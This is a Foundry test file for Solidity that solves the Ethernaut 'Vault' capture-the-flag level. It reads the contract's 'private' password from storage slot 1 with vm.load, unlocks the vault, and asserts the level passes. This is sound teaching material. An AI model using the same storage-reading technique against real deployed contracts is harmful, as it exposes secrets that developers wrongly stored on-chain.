// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/8-Vault/VaultFactory.sol";
import "../src/Ethernaut.sol";

contract VaultTest is Test {
    Ethernaut ethernaut;
    address eoaAddress = address(100);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(eoaAddress, 5 ether);
    }

    function testVaultHack() public {
        // Level setup
        VaultFactory vaultFactory = new VaultFactory();
        ethernaut.registerLevel(vaultFactory);
        vm.startPrank(eoaAddress);
        address levelAddress = ethernaut.createLevelInstance(vaultFactory);
        Vault ethernautVault = Vault(payable(levelAddress));

        // Level attack
        bytes32 password = vm.load(levelAddress, bytes32(uint256(1)));
        emit log_named_bytes32("Password", password);
        ethernautVault.unlock(password);

        // Level submission
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress)); 
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}